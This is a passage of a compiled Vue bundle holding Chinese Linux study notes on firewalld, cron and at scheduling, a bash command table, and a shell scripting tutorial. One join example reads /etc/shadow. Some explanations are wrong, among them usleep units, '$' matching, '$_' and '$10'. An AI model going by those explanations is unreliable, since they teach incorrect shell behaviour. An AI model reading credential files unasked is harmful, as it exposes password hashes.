含义:在public区域，去掉允许ftp服务通过的规则"),t("br"),n._v("\n          #firewall-cmd --permanent --zone=public --add-port=1024/tcp"),t("br"),n._v("\n          含义:在public区域，使用permanent参数，永久添加允许1024端口通过的规则"),t("br"),n._v("\n          #firewall-cmd --reload"),t("br"),n._v("\n          含义:重新加载配置"),t("br")])]),t("tr",[t("td",[n._v("crond")]),t("td",[n._v("计划任务服务")]),t("td"),t("td")]),t("tr",{attrs:{height:"36"}},[t("td",{staticStyle:{height:"202.50pt"},attrs:{height:"270",rowspan:"9"}},[n._v("任务计划")]),t("td",[n._v("tab键")]),t("td",[n._v("命令自动补全")]),t("td"),t("td",[n._v("按一下会自动展开；"),t("br"),n._v("按两下会列出所有命令")])]),t("tr",[t("td",[n._v("nohup")]),t("td",[n._v("不挂断的运行")]),t("td"),t("td")]),t("tr",[t("td",[n._v("&")]),t("td",[n._v("后台运行")]),t("td"),t("td",[n._v("command &")])]),t("tr",[t("td",[n._v("Ctrl+Z")]),t("td",[n._v("后台运行")]),t("td"),t("td")]),t("tr",[t("td",[n._v("jobs")]),t("td",[n._v("列出作业")]),t("td"),t("td")]),t("tr",[t("td",[n._v("fg")]),t("td",[n._v("前台")]),t("td",[n._v("%number 表示jobs的"),t("span",{},[n._v("工作代号")])]),t("td",[n._v("fg %2 后台程序切到前台")])]),t("tr",[t("td",[n._v("bg")]),t("td",[n._v("后台")]),t("td",[n._v("%number 表示jobs的"),t("span",{},[n._v("工作代号")])]),t("td",[n._v("bg %1 将Stopped状态的后台程序改为Running状态")])]),t("tr",{staticStyle:{height:"40.50pt"},attrs:{height:"54"}},[t("td",[n._v("at")]),t("td",[n._v("一次性运行的任务计划")]),t("td",[n._v("\n          systemctl start atd  "),t("br"),n._v("\n          -f 要提交的脚本"),t("br"),n._v("\n        -r 清除"),t("br"),n._v("\n        -l 罗列"),t("br"),n._v("\n         atq 查看没有执行的计划任务"),t("br"),n._v("\n         atrm 任务号 删除指定的计划任务"),t("br")]),t("td",[n._v("\n          at 3:00pm tomorrow -f /home/wuxh/hello.sh"),t("br"),n._v("\n          at now + 5 minutes\n        ")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",[n._v("crontab")]),t("td",[n._v("循环运行的任务计划")]),t("td",[n._v("\n          -l：list，列出指定用户的计划任务列表 "),t("br"),n._v("\n          -e：edit，编辑指定用户的计划任务列表 "),t("br"),n._v("\n          -u：user，指定的用户名，如果不指定，则表示当前用户 "),t("br"),n._v("\n          -r：remove，删除指定用户的计划任务列表 "),t("br"),n._v("\n          黑名单==配置文件位于：`/etc/cron.deny "),t("br"),n._v("\n          白名单==配置文件位于：/etc/cron.allow  "),t("br"),n._v("\n          日志文件位于`/var/log/cron` "),t("br")]),t("td",[n._v("\n          格式： "),t("br"),n._v("\n          四个符号："),t("br"),n._v("\n          *：表示取值范围中的每一个数字"),t("br"),n._v("\n          -：做连续区间表达式的，要想表示1~7，则可以写成：1-7"),t("br"),n._v("\n          /：表示每多少个，例如：想每 10 分钟一次，则可以在分的位置写：*/10"),t("br"),n._v("\n          ,：表示多个取值，比如想在 1 点，2 点 6\n          点执行，则可以在时的位置写：1,2,6"),t("br"),n._v("\n          分 时 日 月 周 需要执行的命令"),t("br"),n._v("\n          问题1：每月1、10、22 日的4:45 重启network 服务"),t("br"),n._v("\n          问题1：45 4 1,10,22 * * service network restart"),t("br"),n._v("\n          问题2：每周六、周日的1:10 重启network 服务"),t("br"),n._v("\n          问题2：10 1 * * 6,7 service network restart"),t("br"),n._v("\n          问题3：每天18:00 至23:00 之间每隔30 分钟重启network 服务"),t("br"),n._v("\n          问题3：*/30 18-23 * * * service network restart"),t("br"),n._v("\n          问题4：每隔两天的上午8 点到11 点的第3 和第15 分钟执行一次重启"),t("br"),n._v("\n          问题4：3,15 8-11 */2 * * reboot"),t("br")])]),t("tr",{attrs:{height:"36"}},[t("td",{staticStyle:{height:"1458.75pt"},attrs:{height:"1945",rowspan:"45"}},[n._v("\n          Bash\n        ")]),t("td",[n._v("bash")]),t("td",[n._v("执行脚本")]),t("td"),t("td",[n._v("bash helloworld.sh"),t("br"),n._v("./w.sh")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("重定向符 >")]),t("td",[n._v("标准输出")]),t("td"),t("td",[n._v("\n          command > out.file 2>&1 &"),t("br"),n._v("command 2> err.txt\n          >&2\n        ")])]),t("tr",[t("td",[n._v("重定向符 >>")]),t("td",[n._v("追加")]),t("td"),t("td",[n._v("cal >> c.txt")])]),t("tr",[t("td",[n._v("重定向符 2>")]),t("td",[n._v("标准错误")]),t("td"),t("td",[n._v("ls ddd 2> /dev/null")])]),t("tr",[t("td",[n._v("重定向符 <")]),t("td"),t("td"),t("td",[n._v("sort < name.txt > name.out")])]),t("tr",[t("td",[n._v("重定向符 <<")]),t("td"),t("td"),t("td")]),t("tr",{attrs:{height:"90"}},[t("td",[n._v("正则表达式")]),t("td",{attrs:{colspan:"2"}},[n._v("\n          . 匹配任意字符"),t("br"),n._v("^ 匹配行首"),t("br"),n._v("$ 匹配文件尾"),t("br"),n._v("[]\n          匹配字符组之一"),t("br"),n._v("* 匹配0到n个字符"),t("br"),n._v("\\{min,max\\}"),t("br"),n._v("\\(…\\)\n        ")]),t("td",[n._v("\n          XXX* 匹配至少两个连续的X"),t("br"),n._v("X\\{1,10\\} 匹配1到10个连续的X"),t("br"),n._v("^\\(.\\)\n          匹配行首的第一个字符（不管是什么）"),t("br"),n._v("^\\(.\\).*\\1$\n          匹配一行中的头一个字符和最后一个字符相同的行\n        ")])]),t("tr",[t("td",[n._v("管道符 |")]),t("td"),t("td"),t("td")]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("双引号")]),t("td",[n._v("引用字符串,但对$,`,\\敏感")]),t("td",[n._v('""')]),t("td",[n._v('echo "$$"'),t("br"),n._v('echo "\\$$"')])]),t("tr",[t("td",[n._v("单引号")]),t("td",[n._v("引用字符串，对特殊字符不敏感")]),t("td",[n._v("''")]),t("td",[n._v("echo '$$'")])]),t("tr",[t("td",[n._v("反引号")]),t("td",[n._v("将反引号内的字符串作为命令")]),t("td",[n._v("``")]),t("td",[n._v("echo `date`")])]),t("tr",{attrs:{height:"90"}},[t("td",[n._v("命令集")]),t("td",[n._v("一行中执行多个命令")]),t("td",[n._v("\n          ; 顺序执行"),t("br"),n._v("&& 前面成功后续才执行"),t("br"),n._v("||\n          前面失败后续才执行\n        ")]),t("td",[n._v("ls;ls"),t("br"),n._v("ls&&ls"),t("br"),n._v("ls||ls")])]),t("tr",{staticStyle:{height:"135.00pt"},attrs:{height:"180"}},[t("td",[n._v("变量")]),t("td",{attrs:{colspan:"2"}},[n._v("\n          位置变量"),t("br"),n._v("$$ 脚本当前进程ID"),t("br"),n._v("$! 后台运行的最后一个进程的ID"),t("br"),n._v("$?\n          命令的退出状态（0表示成功，1表示失败）"),t("br"),n._v("$# 传递到脚本的参数个数"),t("br"),n._v("$*\n          以一个单字符串的形式显示所有向脚本传递的参数"),t("br"),n._v("$@\n          与$*相同，但是使用时加引号，并在引号中返回每个参数"),t("br"),n._v("$_ 就是set命令\n        ")]),t("td",[n._v("\n          观察$*和$@的不同："),t("br"),n._v('for i in "$*"'),t("br"),n._v("do"),t("br"),t("span",{staticStyle:{"mso-spacerun":"yes"}},[n._v("  ")]),n._v("echo $i"),t("br"),n._v("done"),t("br"),t("br"),n._v('for i in "$@"'),t("br"),n._v("do"),t("br"),t("span",{staticStyle:{"mso-spacerun":"yes"}},[n._v("  ")]),n._v("echo $i"),t("br"),n._v("done\n        ")])]),t("tr",{staticStyle:{height:"40.50pt"},attrs:{height:"54"}},[t("td",[n._v("wc")]),t("td",[n._v("统计字数")]),t("td",[n._v("\n          -l：表示lines，行数"),t("br"),n._v("\n          -w：表示words，单词数 量"),t("br"),n._v("\n          -c：表示bytes，字节数 "),t("br")]),t("td",[n._v("\n          cat /etc/passwd | wc -l "),t("br"),n._v("\n          wc -lwc ./* "),t("br"),n._v("\n          wc -l a.txt\n        ")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("sleep")]),t("td",[n._v("等待")]),t("td"),t("td",[n._v("sleep 5 暂停5秒"),t("br"),n._v("usleep 500 这个单位是纳秒")])]),t("tr",[t("td",[n._v("read")]),t("td",[n._v("从键盘读入信息到变量中")]),t("td"),t("td",[n._v("read name")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td"),t("td",[n._v("变量赋值")]),t("td"),t("td",[n._v('\n          PATH="$PATH":/root'),t("br"),n._v("LANG=C"),t("br"),n._v("LANG=zh_CN.gb2312"),t("br"),n._v("PS1='[\\u@\\h\n          \\W]\\$ '\n        ")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("set")]),t("td",[n._v("显示当前shell的变量，包括当前用户的变量（即环境变量）")]),t("td"),t("td",[n._v("set")])]),t("tr",[t("td",[n._v("unset")]),t("td",[n._v("删除变量")]),t("td"),t("td",[n._v("unset i")])]),t("tr",{staticStyle:{height:"40.50pt"},attrs:{height:"54"}},[t("td",[n._v("export")]),t("td",[n._v("\n          把变量即刻导入到当前的用户环境中（被export的变量叫环境变量），这时可以在env中看到\n        ")]),t("td",[n._v("环境变量相当可以被子进程使用，其他变量不行。")]),t("td",[n._v("export LANG=C"),t("br"),n._v("export LC_ALL=en")])]),t("tr",{staticStyle:{height:"40.50pt"},attrs:{height:"54"}},[t("td",[n._v("env")]),t("td",[n._v("显示当前用户环境的变量（被export的变量可以用env查看到）")]),t("td"),t("td",[n._v("env")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("alias")]),t("td",[n._v("命令别名")]),t("td"),t("td",[n._v("alias ll"),t("br"),n._v("alias l=ls -la")])]),t("tr",[t("td",[n._v("unalias")]),t("td",[n._v("取消命令别名")]),t("td"),t("td",[n._v("unlias l")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",[n._v("sort")]),t("td",[n._v("对文件内容做排序")]),t("td",[n._v("-n 以数字排序"),t("br"),n._v("-r 反向排序"),t("br"),n._v("-u 同样的只出现一次")]),t("td",[n._v("sort -n name.txt")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",[n._v("cut")]),t("td",[n._v("提取字符串")]),t("td",[n._v("-c 字符"),t("br"),n._v("-d 分隔符"),t("br"),n._v("-f 字段")]),t("td",[n._v('\n          cat /etc/passwd | cut -d ":" -f1'),t("br"),n._v('last | cut -d "\n          " -f1 列出第一个区块'),t("br"),n._v("who | cut -c1-8,18-\n          每行的1-8个字符和第18行到行尾"),t("br"),n._v("cut -d: -f1,6 /etc/passwd\n        ")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",[n._v("paste")]),t("td",[n._v("和cut相反的命令，合并行")]),t("td",[n._v("-d 指定合并的分隔符"),t("br"),n._v("-s 把文件内的所有行合并为一行")]),t("td",[n._v("\n          paste names numbers 把两个文件的每行都分别合起来"),t("br"),n._v("paste -d'+'\n          names addresses numbers"),t("br"),n._v("paste -s names"),t("br"),n._v("ls | paste -d' ' -s\n        ")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("join")]),t("td",[n._v("把两个文件中相同的行连起来")]),t("td"),t("td",[n._v("\n          join -t ':' /etc/passwd /etc/shadow"),t("br"),n._v("join -t ':' -1 4 /etc/passwd\n          -2 3 /etc/group\n        ")])]),t("tr",{staticStyle:{height:"148.50pt"},attrs:{height:"198"}},[t("td",[n._v("sed")]),t("td",[n._v("Stream Editor流编辑器")]),t("td",[n._v("-n")]),t("td",[n._v("\n          sed 's/Unix/UNIX/' myFile\n          把Unix换成UNIX（没改原文件），但只改动每行的第一个改掉"),t("br"),n._v("sed\n          's/Unix/UNIX/g' myfile > temp.txt 把每行的所有Unix都换成UNIX"),t("br"),n._v("sed\n          '1,2d' myfile 删除第1、2行"),t("br"),n._v("sed '/[Tt]est/d'\n          删除含test或Test的行"),t("br"),n._v("sed '/jan/s/fds/abc/'\n          将所有包含了jan的行中第1个fds改为abc"),t("br"),n._v("sed -n '20,25p' text\n          只显示第20到25行"),t("br"),n._v("sed 's/…//' data 删除文件中每行的前3个字符"),t("br"),n._v("sed\n          's/…$//' data 删除文件中每行的最后3个字符\n        ")])]),t("tr",[t("td",[n._v("awk")]),t("td"),t("td"),t("td",[t("span",{staticStyle:{"mso-spacerun":"yes"}}),n._v("通过正则匹配，切割，提取需要的值"),t("span",{staticStyle:{"mso-spacerun":"yes"}},[n._v("  ")])])]),t("tr",[t("td",[n._v("diff")]),t("td",[n._v("比较两个文件的不同")]),t("td"),t("td",[n._v("diff file1 file2")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("uniq")]),t("td",[n._v("删除重复行从而只显示一个")]),t("td"),t("td",[n._v('\n          last | cut -d " " -f1 | sort | uniq'),t("br"),n._v("查看这个月登录主机的用户都有谁\n        ")])]),t("tr",[t("td",[n._v("source")]),t("td",[n._v("执行脚本")]),t("td"),t("td",[n._v("source helloworld.sh")])]),t("tr",[t("td",[n._v("tee")]),t("td",[n._v("输出到文件的同时显示在屏幕上")]),t("td",[n._v("-a 追加到末尾")]),t("td")]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("tr")]),t("td",[n._v("替换指定内容")]),t("td",[n._v("-d 删除指定串"),t("br"),n._v("-s 替换重复字符")]),t("td",[n._v("\n          cat dostxt | tr -d '\\r' > dostxt-noM "),t("br"),n._v("去掉文件中的DOS下的 ^M\n          断行符\n        ")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("split")]),t("td",[n._v("分割文件")]),t("td",[n._v("-b 以文件size分"),t("br"),n._v("-l 以行数分")]),t("td",[n._v("split -l 5 /etc/passwd test")])]),t("tr",[t("td",{attrs:{rowspan:"3"}},[n._v("test")]),t("td",[n._v("测试文件")]),t("td"),t("td")]),t("tr",[t("td",[n._v("测试字符串")]),t("td"),t("td")]),t("tr",[t("td",[n._v("测试数值")]),t("td"),t("td")]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("expr")]),t("td"),t("td"),t("td",[n._v("\n          expr 10 + 10 只算整数，真正的计算要用bc（计算器）"),t("br"),n._v("expr 3 \\* 7\n          乘号要转义\n        ")])]),t("tr",{staticStyle:{height:"108.00pt"},attrs:{height:"144"}},[t("td",[n._v("函数")]),t("td"),t("td"),t("td",[n._v("\n          下例可以看出$*和$@的区别："),t("br"),n._v("function testargs"),t("br"),n._v("{"),t("br"),t("span",{staticStyle:{"mso-spacerun":"yes"}},[n._v("        ")]),n._v('echo "There is $# args"'),t("br"),t("span",{staticStyle:{"mso-spacerun":"yes"}},[n._v("        ")]),n._v("echo $10"),t("br"),n._v("}"),t("br"),n._v('testargs "$*"'),t("br"),n._v('testargs\n          "$@"\n        ')])]),t("tr",[t("td",{attrs:{rowspan:"2"}},[n._v("条件判断")]),t("td",[n._v("if")]),t("td"),t("td")]),t("tr",[t("td",[n._v("case")]),t("td"),t("td")]),t("tr",[t("td",{attrs:{rowspan:"3"}},[n._v("循环")]),t("td",[n._v("while … do … done")]),t("td"),t("td")]),t("tr",[t("td",[n._v("until … do … done")]),t("td"),t("td")]),t("tr",{staticStyle:{height:"14.25pt"},attrs:{height:"19"}},[t("td",[n._v("for … do … done")]),t("td"),t("td")])])])}],o={data:function(){return{}}},l=o,c=(t("388d"),t("2877")),p=Object(c["a"])(l,i,s,!1,null,"6dc905ba",null),u=p.exports,m=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)])},d=[],g="\x3c!--\r\n * @Date           : 2021-07-10 01:26:52\r\n * @FilePath       : /jinnian-space/src/pages/linux/md/linux-其他.md\r\n * @Description    : \r\n--\x3e\r\n\r\n \r\n\r\n## **CentOS7防火墙firewalld，常见区域及相应策略规则**\r\n\r\n| 区域     | 默认策略                                                     |\r\n| -------- | ------------------------------------------------------------ |\r\n| trusted  | 允许所有数据包                                               |\r\n| home     | 拒绝流入的流量，除非与流出的流量相关，允许ssh,mdns,ippclient,amba-client,dhcpv6-client服务通过 |\r\n| internal | 等同于home                                                   |\r\n| work     | 拒绝流入的流量，除非与流出的流量相关，允许ssh,ipp-client,dhcpv6-client服务通过 |\r\n| public   | 拒绝流入的流量，除非与流出的流量相关，允许ssh,dhcpv6-client服务通过 |\r\n| external | 拒绝流入的流量，除非与流出的流量相关，允许ssh服务通过        |\r\n| dmz      | 拒绝流入的流量，除非与流出的流量相关，允许ssh服务通过        |\r\n| block    | 拒绝流入的流量，除非与流出的流量相关，非法流量采取拒绝操作   |\r\n| drop     | 拒绝流入的流量，除非与流出的流量相关，非法流量采取丢弃操作   |\r\n",b={data:function(){return{MainComponent:g}}},v=b,h=Object(c["a"])(v,m,d,!1,null,"1373d8e8",null),S=h.exports,y=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("div",[n._v("SHELL")]),t("pre",[n._v('     shell 中 变量赋值 单引号是 字符 双引号是可以解析变量的  $() 是代表可执行命令 或者 模板插值符号反引号也一样\n     shell 中 0 为 真  1 为假 \n     readonly  只读变量\n     unset 删除变量\n     数组： \n        定义：arr=(1 2  3  4  8) \n        赋值: arr[0]=99\n        获取：${arr[1]}\n        获取长度：${#arr[*]}   ${#arr[@]}\n    num1= `expr 2 + 2`  数学运算表达式  expr\n     自增：  e=1  ;  ((e++))  \n     字符串比较 返回布尔值  0 为真 1 为假的: 前后带空格  中间带空格\n        [ $a = $b ]  [ $a != $b ]  是否为0  [ -z $a ]   是否非0  [ -n "$a" ]  是否为空 [ $a ] \n        [ "${a}" = "${b}" ]  [ $a != $b ]  是否为0  [ -z "${a}" ]   是否非0  [ -n "${a}" ]  是否为空 [ $"{$a}" ] \n     $? 获取 上一条 语句的 执行结果   \n     字符串长度  ${#a}\n     关系运算符 只支持数字 ，不支持字符串，除非字符串的值是数字：\n      \n      [ $a -eq $b]   等于 -eq  不等于  -ne  大于 -gt 小于 -lt 大于等于 -ge  小于等于 -le  \n    shell 布尔运算：\n        ! 求反 [ !false]     [ !  $a -lt 20 ]        返回 true    \n        -o or   或运算  [ $a -lt 20 -o $b -gt 100]\n        -a and  与运算  [ $a -lt 20 -a $b -gt 100]\n        &&  逻辑and    [[ true && true ]]   [[ "${a}" -lt 100 && "${b}" -gt 100 ]]\n        ||  逻辑或者    [[ true || true ]]\n    if[条件];then;语句体；fi       ,,,,  if[] then fi  ,,,,if[] then  elif[] else fi \n\n    if [ $(ps -ef | grep -c "ssh") -gt 1] \n\n\n  ')]),t("q-separator"),t("q-markdown",{attrs:{src:n.MainComponent}})],1)},f=[],_='\x3c!--\r\n * @Date           : 2021-01-29 00:52:36\r\n * @FilePath       : /jinnian-space/src/pages/linux/md/shell.md\r\n * @Description    : \r\n--\x3e\r\n## shell\r\n​\t***\\*S\\*******\\*hell程序设计\\****\t\r\n\r\n一、 什么是shell?\r\n\r\n​\tShell是一个作为用户与Linux系统间接口的程序，它允许用户向操作系统输入需要执行的命令。在一个linux系统中可以安装多个shell，这些shell和其他程序一起环绕在linux内核四周。默认安装的标准是/bin/sh，它是GNU工具集中的bash。使用/bin/bash –version可以查看版本。\r\n\r\nShell 历史版本：sh  csh,、tcsh、 zsh  ksh、pdksh  bash\r\n\r\n二、 shell脚本编写、运行、调试\r\n\r\n\\1. 脚本均以 #!/bin/bash开头。\r\n\r\n\\2. 脚本中的 ‘#’为注释符。\r\n\r\n\\3. 使用exit为脚本设置返回一个退出码，注意 0 表示的是执行成功。\r\n\r\n示例：\r\n\r\n \\#!/bin/bash\r\n\r\n \\# this is my first shell! \r\n\r\n echo  “helloword!”\r\n\r\n exit 0\r\n\r\n \r\n\r\n\\4. 设置脚本为可执行： chmod u+x filename.sh\r\n\r\n\\5. 执行：./filename.sh\r\n\r\n\\6. sh –x ./filename.sh\r\n\r\n三、 shell语法\r\n\r\n**1、** ***\\*变量\\****：无需事先声明，直接使用，在访问时要加$在变量前。\r\n\r\n例如：\r\n\r\nStr=hello\r\n\r\necho  $Str \r\n\r\na.这两行语句将在屏幕输出一个“hello”，shell区别大小写，定义变量时应该注意。\r\n\r\nb.如果为变量所赋的字符串中含有空格，table或换行符应使用“”标示，例如 “hello  word!”\r\n\r\nc.变量在引号中依然有效如echo “this  is  $Str！”依然会输出：this  is  hello！\r\n\r\n练习示例：(注:后续的示例中只有关键部分，练习时补全)\r\n\r\necho “input  password:”\r\n\r\nread pasd\r\n\r\necho “the password is $pasd”\r\n\r\nd.如果需要输出字符$Str可以用单引号 和 \\来处理：\r\n\r\n ‘$Str’ 和\\$Str 输出的都是 $Str不是变量表示的值，shell中的变量一般都是字符串形式。\r\n\r\ne: 环境变量，介绍几种：\r\n\r\n$HOME  当前用户的家目录 \r\n\r\n$PATH   搜索命令的目录列表\r\n\r\n$0\t\t\tshell脚本的名字\r\n\r\n$#\t\t\t传递给脚本的参数个数\r\n\r\n$$\t\t\t脚本的进程号\r\n\r\nf:参数变量：\r\n\r\n$1,$2脚本的程序参数\r\n\r\n$*   列出所有参数\r\n\r\n$@   S*的一种变体，它参数不会挤在一块。\r\n\r\ng:变量做整形数字使用：\r\n\r\na=123\r\n\r\nlet “a +=1”\r\n\r\necho “a = $a”\r\n\r\n**2、** ***\\*条件\\****\r\n\r\n1) 使用 test 或 [ ]\r\n\r\n如  if test –f file.c\r\n\r\nthen\r\n\r\n…..\r\n\r\nfi\r\n\r\n​    以上代码也可写成如下形式(尽量使用这种形式)\r\n\r\n​     if [ -f file.c ]  (注意:if语句和[之间有个空格]\r\n\r\n​    then\r\n\r\n​     ….\r\n\r\n​     fi\r\n\r\n完整示例：\r\n\r\n\\#!/bin/bash\r\n\r\necho  “is  it  morning? Please  answer  yes  or  no”\r\n\r\nread  timeofday\r\n\r\nif [ $timeofday = “yes” ] ;then\r\n\r\n  echo  “good morning”\r\n\r\nelse\r\n\r\n  echo  “good afternoon”\r\n\r\nfi\r\n\r\nexit 0\r\n\r\n2) elif语句，在if，else语句中增加分支判断。如下示例：\r\n\r\n  \\#!/bin/bash\r\n\r\necho  “is  it  morning? Please  answer  yes  or  no”\r\n\r\nread  timeofday\r\n\r\nif [ $timeofday = “yes” ] ;then\r\n\r\n   echo  “good morning”\r\n\r\nelif [ $timeofday = “no” ]\r\n\r\nthen\r\n\r\n  echo “Good afternoon”\r\n\r\nelse\r\n\r\n  echo “sorry ,$timeofday not recognized. Enter yes or no”\r\n\r\n  exit 1\r\n\r\nfi\r\n\r\nexit 0\r\n\r\n**3、** ***\\*一个与变量有关的问题。\\****\r\n\r\n如上程序，如果没有输入Yes和no直接按回车键，会出现什么结果呢？程序会有出错信息。原因是。。。避免该问题产生的方法对变量使用双引号“$Str”\r\n\r\n**4、** ***\\*for语句\\****\r\n\r\n使用for语句可以循环处理一组值，这组值可以是任意字符串的集合。 它的语法形式如下：\r\n\r\n***\\*for\\**** variable  ***\\*in\\**** values\r\n\r\n***\\*do\\****\r\n\r\n  something\r\n\r\n***\\*done\\****\r\n\r\n 示例：\r\n\r\n  \\#!/bin/bash\r\n\r\n  For foo in hello myname 129\r\n\r\n  do\r\n\r\n   echo $foo\r\n\r\n  done\r\n\r\n  exit 0\r\n\r\n使用通配符扩展for循环\r\n\r\n\\#!/bin/sh\r\n\r\nfor file in $(ls  *.sh);do\r\n\r\n echo $file\r\n\r\ndone\r\n\r\nexit 0\r\n\r\n***\\*5、while语句\\****\r\n\r\n语法结构：\r\n\r\n***\\*while\\**** condition ***\\*do\\****\r\n\r\nDosometing\r\n\r\n***\\*done\\****\r\n\r\n示例：一个简陋的密码检查程序\r\n\r\n\\#!/bin/bash\r\n\r\necho  “Enter password”\r\n\r\nread  paword\r\n\r\nwhile  [ “$paword” != “secret” ] \r\n\r\ndo\r\n\r\n  echo “sorry, try again ”\r\n\r\n  read paword \r\n\r\ndone\r\n\r\nexit 0\r\n\r\n字符串比较:\r\n\r\nstring = string  \r\n\r\nstring != string\r\n\r\n-n string\r\n\r\n-z string \r\n\r\n 算数比较\r\n\r\n num1 –eq  num2 \r\n\r\n num1 –ne  num2\r\n\r\n \r\n\r\n***\\*6、until语句,与while循环类似，只是把测试条件反过来了。\\****\r\n\r\n语法形式如下：\r\n\r\n***\\*until\\**** condition\r\n\r\n***\\*do\\****\r\n\r\n  Dosomething\r\n\r\n***\\*done\\****\r\n\r\n***\\*7、case语句\\****\r\n\r\n***\\*语法结构:\\****\r\n\r\n***\\*case\\****  variable ***\\*in\\****\r\n\r\npattern1 [ ***\\*|\\**** pattern] …***\\*)\\****  dosomething ***\\*;;\\****\r\n\r\npattern2 [ ***\\*|\\**** pattern] …***\\*)\\****  dosomething ***\\*;;\\****\r\n\r\n***\\*esac\\****\r\n\r\n该语句 执行 vairable与第一个pattern匹配上的语句。\r\n\r\n例如：\r\n\r\n\\#!/bin/bash\r\n\r\necho “is it morning? Please answer yes or no”\r\n\r\nread  timeofday\r\n\r\ncase “$timeofday” in\r\n\r\n   yes ) echo “good moring”;;\r\n\r\n   no ) echo “good afternoon”;;\r\n\r\ny) echo “good morning”;;\r\n\r\nn) echo “good afternoon”;;\r\n\r\n*)echo “sorry,answer not recognized” ;;\r\n\r\n esac\r\n\r\n exit 0\r\n\r\n 匹配部分语句也可改写为：\r\n\r\n case  “$timeofday” in\r\n\r\n​    yes | y | Yes | YES ) echo “good morning”;;\r\n\r\n​    n* | N* )     echo “good afternoon”;;\r\n\r\n​    *)        echo “sorry, answer not recognized”;;\r\n\r\n esac\r\n\r\n也可以将匹配行改为; [yY]|[Yy][Ee][Ss]\r\n\r\n***\\*8、命令列表\\****\r\n\r\n 有时需要将好几条命令连接成一个序列。如下\r\n\r\n if [ -f this_file ]; then\r\n\r\n   if [ -f that_file ]; then\r\n\r\n​     if [ -f the_other_file ]; then\r\n\r\n​       echo “all  files present, and correct”\r\n\r\n​     fi\r\n\r\n   fi\r\n\r\nfi\r\n\r\n \r\n\r\n***\\*9、AND列表\\****\r\n\r\n  只有在前一条命令执行成功返回true才执行下一条。语法结构：\r\n\r\n Statement1  ***\\*&&\\**** Statement1  ***\\*&&\\**** Statement1  ***\\*&&\\**** ***\\*…\\****\r\n\r\n示例:\r\n\r\n\\#!/bin/bash\r\n\r\ntouch file_one\t\r\n\r\nrm –f file_two\r\n\r\nif [ -f file_one ] && echo “hello” && [ -f file_two ] && echo “there”\r\n\r\nthen\r\n\r\n  echo “in if”\r\n\r\nelse\r\n\r\n  echo “in else”\r\n\r\nfi\r\n\r\nexit 0\r\n\r\n***\\*10、OR列表 ，直到有一条命令执行成功为止。\\****\r\n\r\n 语法结构：\r\n\r\n Statement1 ***\\*||\\**** Statement2 ***\\*||\\**** Statement3 ***\\*||\\**** ***\\*…\\****\r\n\r\n示例：\r\n\r\nif [ -f file_one ] || echo “hello” || echo “there”\r\n\r\nthen\r\n\r\n  echo “in if”\r\n\r\nelse\r\n\r\necho “in else”\r\n\r\nfi\r\n\r\n***\\*11、语句块\\****\r\n\r\n如果想在只允许使用单个语句的地方（如 AND，OR）使用多条语句，可以是花括号{}来构造一个块。如下：\r\n\r\n  Get_confirm && {\r\n\r\n​    echo “hello”\r\n\r\n​    cat $tmp_file > $tracks_file\r\n\r\nadd_record_tracks\r\n\r\n}\r\n\r\n***\\*12、函数\\****\r\n\r\n要定义一个shell函数，只需写出它的名字，加上括弧，再把函数要实现的语句放在一对花括号中，如下所示：\r\n\r\nfunction_name ***\\*() {\\****\r\n\r\n   Statements\r\n\r\n***\\*}\\****\r\n\r\n示例：\r\n\r\n\\#!/bin/bash\r\n\r\nfoo(){\r\n\r\n  echo  “function foo is executing”\r\n\r\n}\r\n\r\necho  “ this is foo… ”\r\n\r\nfoo\r\n\r\necho “foo end!”\r\n\r\nexit 0\r\n\r\n如果在函数中没有return命令指定一个返回值，则函数返回的就是执行的最后一条命令的退出码。\r\n\r\n示例 \r\n\r\n\\#!/bin/bash\r\n\r\n\\# 函数部分\r\n\r\nYes_or_no(){\r\n\r\n  Echo “is your name $* ?”\r\n\r\n while true\r\n\r\ndo\r\n\r\n  echo –n “Enter yes or no: ”\r\n\r\n  read x\r\n\r\n case “$x” in\r\n\r\n  y | yes ) return 0;;\r\n\r\n  n | no ) return 1;;\r\n\r\n  *) echo “please input yes or no”\r\n\r\n esac\r\n\r\ndone\r\n\r\n\\#主程序部分\r\n\r\necho  “original parameters are $*”\r\n\r\nif  yes_or_no “$1”\r\n\r\nthen\r\n\r\n  echo “HI  $1,nice name”\r\n\r\nelse\r\n\r\n  echo “never mind”\r\n\r\nfi\r\n\r\nexit 0\r\n\r\n在函数内部定义的变量，在函数运行后，变量依然有效，如果只想在本函数内使用临时变量，可在变量前加上 ***\\*local\\****\r\n\r\n\\#!/bin/bash\r\n\r\nfoo()\r\n\r\n{\r\n\r\n local  str=aaaa ***\\*#\\*******\\*如果此处无local 则 最后的语句是可以输出aaaa\\*******\\*的\\****\r\n\r\necho "in foo $str"\r\n\r\n}\r\n\r\nfoo\r\n\r\necho "over $str"\r\n\r\n \r\n\r\n$# 表示参数个数，$1为第一个参数依次类推。（$*,$@）\r\n\r\n脚本中无函数的声明，调用某个函数前，该函数需要先被定义，所以函数的定义可以写在脚本的开始。\r\n\r\n \r\n\r\n***\\*13、一些命令\\****\r\n\r\n1）break 命令\r\n\r\n 在控制条件为满足之前，可以跳出 for，while，until循环，后面可带参数值，来表明要跳出的循环层数，但我们不建议这么做。\r\n\r\n2) :命令\r\n\r\n冒号（：）命令是一个空命令。偶尔被运用简化逻辑，相当于true。\r\n\r\n3) 